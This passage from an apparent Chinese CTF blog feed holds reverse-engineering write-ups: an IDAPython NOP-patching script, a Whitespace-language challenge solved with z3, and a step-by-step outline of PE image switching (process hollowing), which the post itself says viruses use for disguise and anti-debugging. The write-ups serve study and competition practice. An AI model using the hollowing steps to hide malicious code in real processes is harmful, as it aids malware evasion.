class="number">0x17A6F</span>:</span><br><span class="line">            curr = curr+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            curr=next_ea</span><br><span class="line">        <span class="built_in">print</span>(curr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>(<span class="params">start,end</span>):</span></span><br><span class="line">    curr=start</span><br><span class="line">    <span class="keyword">while</span> curr != idaapi.BADADDR <span class="keyword">and</span> curr &lt; end:</span><br><span class="line">        <span class="keyword">if</span> idc.is_data(curr):</span><br><span class="line">            idc.PatchByte(curr,<span class="number">0x90</span>)</span><br><span class="line">        next_ea = idaapi.get_first_cref_from(curr)</span><br><span class="line">        <span class="keyword">if</span> (curr&lt;end <span class="keyword">and</span> next_ea == BADADDR) <span class="keyword">or</span> curr==<span class="number">0xbf6a</span> <span class="keyword">or</span> curr==<span class="number">0x17A6F</span>:</span><br><span class="line">            curr = curr+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            curr=next_ea</span><br><span class="line">        <span class="built_in">print</span>(curr)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#undefine(0x0,0x224c6)</span></span><br><span class="line"><span class="comment">#make_code(0x0,0x224C6)</span></span><br><span class="line"><span class="comment">#clear(0x22460,0x224c6)</span></span><br><span class="line">nop(<span class="number">0x0</span>,<span class="number">0x224c6</span>)</span><br></pre></td></tr></table></figure><p>​    但是好像写得有点太复杂了，也没法完全实现自动 patch</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://ctftime.org/writeup/29116">https://ctftime.org/writeup/29116</a></li><li><a href="https://www.dongzt.cn/archives/python%E4%B8%AD%E7%88%86%E7%A0%B4%E5%90%84%E7%A7%8Dhash%E5%8A%A0%E5%AF%86%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF.html">python中爆破各种hash加密的新姿势</a></li><li><a href="https://docs.python.org/zh-cn/3/library/itertools.html">https://docs.python.org/zh-cn/3/library/itertools.html</a></li><li><a href="https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/">https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/</a></li><li><a href="https://cdn.jsdelivr.net/gh/it-ebooks-0/it-ebooks-2017-04to06/the%20beginner's%20guide%20to%20idapython%20%E4%B8%AD%E6%96%87%E7%89%88.pdf">idaPython教程</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;不算 wp，只是记录一下从这题中学习到的知识&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="idapython" scheme="https://www.0wl.site/tags/idapython/"/>
    
  </entry>
  
  <entry>
    <title>近期计划</title>
    <link href="https://www.0wl.site/2021/07/03/%E8%BF%91%E6%9C%9F%E8%AE%A1%E5%88%92/"/>
    <id>https://www.0wl.site/2021/07/03/%E8%BF%91%E6%9C%9F%E8%AE%A1%E5%88%92/</id>
    <published>2021-07-03T14:10:25.000Z</published>
    <updated>2021-12-13T14:11:58.006Z</updated>
    
    <content type="html"><![CDATA[<div class="fas fa-arrow-alt-circle-up" style="color:#3273dc"><span class="level-item" style="color:#3273dc">&nbsp;置顶</span></div><span id="more"></span><ul><li>期末考</li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;fas fa-arrow-alt-circle-up&quot; style=&quot;color:#3273dc&quot;&gt;
	&lt;span class=&quot;level-item&quot; style=&quot;color:#3273dc&quot;&gt;&amp;nbsp;置顶&lt;/span&gt;
&lt;/div&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PE映像切换-minilctf</title>
    <link href="https://www.0wl.site/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/"/>
    <id>https://www.0wl.site/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/</id>
    <published>2021-07-01T14:49:05.000Z</published>
    <updated>2021-07-03T14:52:00.457Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>记录一下反调试中的 PE 映像切换技术</p></div></article><span id="more"></span><h2 id="有关-PE-映像切换"><a href="#有关-PE-映像切换" class="headerlink" title="有关 PE 映像切换"></a>有关 PE 映像切换</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><div class="notification is-info"><p>首先先以挂起的模式运行 A.exe 进程，然后将一个完全不同的 PE 文件的映像映射到 A.exe 的内存空间，并运行。A.exe 即 “外壳进程 ”，B.exe 为 “内核进程”    （相当于偷梁换柱</p><p>这一技术主要用于病毒程序的伪装，反调试</p></div><img src="/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/%E5%88%87%E6%8D%A2%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" class=""><h3 id="具体实现过程"><a href="#具体实现过程" class="headerlink" title="具体实现过程"></a>具体实现过程</h3><h4 id="0x01-把-real-exe-载入内存，并创建进程-fake-exe"><a href="#0x01-把-real-exe-载入内存，并创建进程-fake-exe" class="headerlink" title="0x01  把 real.exe 载入内存，并创建进程 fake.exe"></a>0x01  把 real.exe 载入内存，并创建进程 fake.exe</h4><p>​        此时进程处于挂起状态，可以<strong>自由操控内存空间</strong></p><h4 id="0x02-获取-fake-exe-实际加载基地址"><a href="#0x02-获取-fake-exe-实际加载基地址" class="headerlink" title="0x02  获取 fake.exe 实际加载基地址"></a>0x02  获取 fake.exe 实际加载基地址</h4><img src="/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/imagebase.jpg" class=""><h4 id="0x03-获取-real-exe-的基地址"><a href="#0x03-获取-real-exe-的基地址" class="headerlink" title="0x03  获取 real.exe 的基地址"></a>0x03  获取 real.exe 的基地址</h4><p>​        在 PE 文件头中获取</p><h4 id="0x04-比较这两个基地址"><a href="#0x04-比较这两个基地址" class="headerlink" title="0x04  比较这两个基地址"></a>0x04  比较这两个基地址</h4><h5 id="1-两个基地址相同"><a href="#1-两个基地址相同" class="headerlink" title="1.两个基地址相同"></a>1.两个基地址相同</h5><p>​        利用 ntdll 里的 <strong>ZwUnmapViewOfSection</strong> 卸载 fake.exe 的映射,分配内存空间再将 real.exe 映射到进程内存</p><h5 id="2-两个基地址不同"><a href="#2-两个基地址不同" class="headerlink" title="2.两个基地址不同"></a>2.两个基地址不同</h5><p>​        可直接将 real.exe 映射到 fake.exe 进程内存，再把 PEB.Imagebase 改为 real.exe 的基地址</p><h4 id="0x05-修改EP"><a href="#0x05-修改EP" class="headerlink" title="0x05  修改EP"></a>0x05  修改EP</h4><p>​        <code>CONTEXT.Eax</code> 存储 fake.exe 的 EP 地址，<code>CONTEXT.Eip</code> 存储 <strong>ntdll！RtlUserThreadStart</strong> 这个API的地址，通过这个API跳转到 EP 代码</p><h2 id="miniLctf-Re1"><a href="#miniLctf-Re1" class="headerlink" title="miniLctf  Re1"></a>miniLctf  Re1</h2><p>​        在看完上面这部分内容后突然想起来之前的 <code>miniLctf</code> 里的 Re1 好像有涉及这方面的知识，于是就重新分析了一下<img src="/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/minil.png" class=""></p><p>​        可以根据最后修改 EP 时的地址找到 real.exe 导出分析</p><p>​        导出之后的解题过程就不详细叙述了应该比较简单，关注 TLS 就行</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《逆向工程核心原理》</li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;记录一下反调试中的 PE 映像切换技术&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="反调试" scheme="https://www.0wl.site/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Final: Spaceship </title>
    <link href="https://www.0wl.site/2021/06/02/XCTF-Final-Spaceship/"/>
    <id>https://www.0wl.site/2021/06/02/XCTF-Final-Spaceship/</id>
    <published>2021-06-02T11:24:26.000Z</published>
    <updated>2021-11-16T14:55:21.777Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>对 Xctf Final Re 题： SpaceShip 的复现</p></div></article><span id="more"></span><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>​            下载得到 <code>ws</code> 后缀的文件 ，谷歌查 <code>ws</code> 后缀文件        </p><img src="/2021/06/02/XCTF-Final-Spaceship/space1.png" class=""><p>​            不过这不对，根据文件内只有空格、换行符等以及比赛时队友找到    的资料，应该是 <strong>WhiteSpace</strong> 语言</p><img src="/2021/06/02/XCTF-Final-Spaceship/space2.png" class=""><p>​            用工具可以把这个语言转成 <code>python</code> 和汇编形式</p><p>​    <a href="https://github.com/Smithers888/BlueSpace">https://github.com/Smithers888/BlueSpace</a></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>​            转换得到的 <code>python</code> 文件可以直接运行，所以可以直接调试看逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stssstttsttn</span>():</span></span><br><span class="line">    stack.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = <span class="built_in">ord</span>(sys.stdin.read(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        x = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18 = Ints(&#x27;x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18&#x27;)</span></span><br><span class="line"></span><br><span class="line">    heap[stack.pop()] = x<span class="comment">#调试时改动</span></span><br><span class="line">    stack.append(<span class="number">0</span>)</span><br><span class="line">    stack.append(<span class="number">0</span>)</span><br><span class="line">    stack[-<span class="number">1</span>] = heap[stack[-<span class="number">1</span>]]</span><br><span class="line">    stack.append(<span class="number">16777216</span>)</span><br><span class="line">    x = stack.pop()</span><br><span class="line">    stack[-<span class="number">1</span>] += x</span><br><span class="line">    stack.append(<span class="number">16777216</span>)</span><br><span class="line">    x = stack.pop()</span><br><span class="line">    stack[-<span class="number">1</span>] %= x</span><br><span class="line">    x = stack.pop()</span><br><span class="line">    </span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">      stack.append(<span class="number">0</span>)</span><br><span class="line">    stack[-<span class="number">1</span>] = heap[stack[-<span class="number">1</span>]]</span><br><span class="line">    stack.append(<span class="number">1</span>)</span><br><span class="line">    stack[-<span class="number">1</span>] = heap[stack[-<span class="number">1</span>]]</span><br><span class="line">    x = stack.pop()</span><br><span class="line">    stack[-<span class="number">1</span>] -= x</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> stack.pop() &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> sttsssttssstn</span><br><span class="line">    <span class="keyword">except</span> Z3Exception:<span class="comment">#异常</span></span><br><span class="line">        <span class="built_in">print</span>(stack,heap)</span><br></pre></td></tr></table></figure><p>​            这部分读取并对输入进行运算，从下面这些数字猜测进行了方程的    运算</p><p>​            根据学长的思路可以把输入都转换成 z3 里的符号，那么在之后判    断大小的时候会因为符号不能比大小而抛出异常，就可以打印出表达式（这做法太灵活了，自己根本想不到…）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16777089</span>: ((((((<span class="number">0</span> +</span><br><span class="line">      (<span class="number">2</span>*((x10 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">      <span class="number">16777216</span>)%</span><br><span class="line">     <span class="number">16777216</span>)%</span><br><span class="line">    <span class="number">3251</span> +</span><br><span class="line">    (<span class="number">10</span>*((x8 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">    <span class="number">16777216</span>)%</span><br><span class="line">   <span class="number">16777216</span>)%</span><br><span class="line">  <span class="number">3251</span> +</span><br><span class="line">  (<span class="number">3</span>*((x11 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">  <span class="number">16777216</span>)%</span><br><span class="line"> <span class="number">16777216</span>)%</span><br><span class="line"><span class="number">3251</span>, <span class="number">16777086</span>: <span class="number">11</span>, <span class="number">16777085</span>: ((((((<span class="number">0</span> +</span><br><span class="line">      (<span class="number">2</span>*((x10 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">      <span class="number">16777216</span>)%</span><br><span class="line">     <span class="number">16777216</span>)%</span><br><span class="line">    <span class="number">3251</span> +</span><br><span class="line">    (<span class="number">10</span>*((x8 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">    <span class="number">16777216</span>)%</span><br><span class="line">   <span class="number">16777216</span>)%</span><br><span class="line">  <span class="number">3251</span> +</span><br><span class="line">  (<span class="number">3</span>*((x11 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">  <span class="number">16777216</span>)%</span><br><span class="line"> <span class="number">16777216</span>)%</span><br><span class="line"><span class="number">3251</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#堆的数据</span></span><br><span class="line">heap =</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: <span class="number">10</span> </span><br><span class="line"> <span class="number">1</span>: <span class="number">446</span> </span><br><span class="line"> <span class="number">2</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="number">3</span>: <span class="number">16777074</span> </span><br><span class="line"> <span class="number">4</span>: <span class="number">16777077</span> </span><br><span class="line"> <span class="number">5</span>: <span class="number">16777076</span> </span><br><span class="line"> <span class="number">6</span>: <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="number">8</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">9</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">10</span>: <span class="number">10</span> </span><br><span class="line"> <span class="number">11</span>: <span class="number">8</span> </span><br><span class="line"> <span class="number">12</span>: <span class="number">3</span> </span><br><span class="line"> <span class="number">13</span>: <span class="number">11</span> </span><br><span class="line"> <span class="number">14</span>: <span class="number">1753</span> </span><br><span class="line"> <span class="number">15</span>: <span class="number">7</span> </span><br><span class="line"> <span class="number">16</span>: <span class="number">17</span> </span><br><span class="line"> <span class="number">17</span>: <span class="number">6</span> </span><br><span class="line"> <span class="number">18</span>: <span class="number">4</span> </span><br><span class="line"> <span class="number">19</span>: <span class="number">8</span> </span><br><span class="line"> <span class="number">20</span>: <span class="number">16</span> </span><br><span class="line"> <span class="number">21</span>: <span class="number">2117</span> </span><br><span class="line"> <span class="number">22</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">23</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">24</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">25</span>: <span class="number">15</span> </span><br><span class="line"><span class="number">26</span>: <span class="number">6</span> </span><br><span class="line"><span class="number">27</span>: <span class="number">6</span> </span><br><span class="line"><span class="number">28</span>: <span class="number">1071</span> </span><br><span class="line"><span class="number">29</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">30</span>: <span class="number">17</span> </span><br><span class="line"><span class="number">31</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">32</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">33</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">34</span>: <span class="number">16</span> </span><br><span class="line"><span class="number">35</span>: <span class="number">1116</span> </span><br><span class="line"><span class="number">36</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">37</span>: <span class="number">14</span> </span><br><span class="line"><span class="number">38</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">39</span>: <span class="number">0</span> </span><br><span class="line"><span class="number">40</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">41</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">42</span>: <span class="number">2190</span> </span><br><span class="line"><span class="number">43</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">44</span>: <span class="number">14</span> </span><br><span class="line"><span class="number">45</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">46</span>: <span class="number">0</span> </span><br><span class="line"><span class="number">47</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">48</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">49</span>: <span class="number">1764</span> </span><br><span class="line"><span class="number">50</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">51</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">52</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">53</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">54</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">55</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">56</span>: <span class="number">617</span> </span><br><span class="line"><span class="number">57</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">58</span>: <span class="number">14</span> </span><br><span class="line"><span class="number">59</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">60</span>: <span class="number">0</span> </span><br><span class="line"><span class="number">61</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">62</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">63</span>: <span class="number">2193</span> </span><br><span class="line"><span class="number">64</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">65</span>: <span class="number">17</span> </span><br><span class="line"><span class="number">66</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">67</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">68</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">69</span>: <span class="number">16</span> </span><br><span class="line"><span class="number">70</span>: <span class="number">866</span> </span><br><span class="line"><span class="number">71</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">72</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">73</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">74</span>: <span class="number">15</span> </span><br><span class="line"><span class="number">75</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">76</span>: <span class="number">6</span> </span><br><span class="line"><span class="number">77</span>: <span class="number">1594</span> </span><br><span class="line"><span class="number">78</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">79</span>: <span class="number">12</span> </span><br><span class="line"><span class="number">80</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">81</span>: <span class="number">13</span> </span><br><span class="line"><span class="number">82</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">83</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">84</span>: <span class="number">1153</span> </span><br><span class="line"><span class="number">85</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">86</span>: <span class="number">12</span> </span><br><span class="line"><span class="number">87</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">88</span>: <span class="number">13</span> </span><br><span class="line"><span class="number">89</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">90</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">91</span>: <span class="number">1737</span> </span><br><span class="line"><span class="number">92</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">93</span>: <span class="number">12</span> </span><br><span class="line"><span class="number">94</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">95</span>: <span class="number">13</span> </span><br><span class="line"><span class="number">96</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">97</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">98</span>: <span class="number">1445</span> </span><br><span class="line"><span class="number">99</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">100</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">101</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">102</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">103</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">104</span>: <span class="number">11</span> </span><br><span class="line"><span class="number">105</span>: <span class="number">2119</span> </span><br><span class="line"><span class="number">106</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">107</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">108</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">109</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">110</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">111</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">112</span>: <span class="number">1237</span> </span><br><span class="line"><span class="number">113</span>: <span class="number">9</span> </span><br><span class="line"><span class="number">114</span>: <span class="number">5</span> </span><br><span class="line"><span class="number">115</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">116</span>: <span class="number">15</span> </span><br><span class="line"><span class="number">117</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">118</span>: <span class="number">6</span> </span><br><span class="line"><span class="number">119</span>: <span class="number">1463</span> </span><br><span class="line"><span class="number">120</span>: <span class="number">7</span> </span><br><span class="line"><span class="number">121</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">122</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">123</span>: <span class="number">8</span> </span><br><span class="line"><span class="number">124</span>: <span class="number">4</span> </span><br><span class="line"><span class="number">125</span>: <span class="number">11</span> </span><br><span class="line"><span class="number">126</span>: <span class="number">2217</span> </span><br><span class="line"><span class="number">127</span>: <span class="number">6</span> </span><br><span class="line"><span class="number">128</span>: <span class="number">3</span> </span><br><span class="line"><span class="number">129</span>: <span class="number">10</span> </span><br><span class="line"><span class="number">130</span>: <span class="number">2</span> </span><br><span class="line"><span class="number">131</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">132</span>: <span class="number">1</span> </span><br><span class="line"><span class="number">133</span>: <span class="number">1871</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​            对照着可以发现 18 个表达式的形式</p><img src="/2021/06/02/XCTF-Final-Spaceship/space3.png" class=""><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">0</span> +</span><br><span class="line">      (<span class="number">2</span>*((x10 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">      <span class="number">16777216</span>)%</span><br><span class="line">     <span class="number">16777216</span>)%</span><br><span class="line">    <span class="number">3251</span> +</span><br><span class="line">    (<span class="number">10</span>*((x8 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">    <span class="number">16777216</span>)%</span><br><span class="line">   <span class="number">16777216</span>)%</span><br><span class="line">  <span class="number">3251</span> +</span><br><span class="line">  (<span class="number">3</span>*((x11 + <span class="number">16777216</span>)%<span class="number">16777216</span>) + <span class="number">16777216</span>)%<span class="number">16777216</span> +</span><br><span class="line">  <span class="number">16777216</span>)%</span><br><span class="line"> <span class="number">16777216</span>)%</span><br><span class="line"><span class="number">3251</span></span><br></pre></td></tr></table></figure><p>​                因为每个变量都在可见字符范围内，所以上面的表达式可以简化成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>*x10+<span class="number">10</span>*x8+<span class="number">3</span>*x11==</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">heap = &#123;<span class="number">0</span>: <span class="number">10</span>, <span class="number">1</span>: <span class="number">446</span>, <span class="number">2</span>: <span class="number">0</span>, <span class="number">3</span>: <span class="number">16777074</span>, <span class="number">4</span>: <span class="number">16777077</span>, <span class="number">5</span>: <span class="number">16777076</span>, <span class="number">6</span>: <span class="number">0</span>, </span><br><span class="line"><span class="number">8</span>: <span 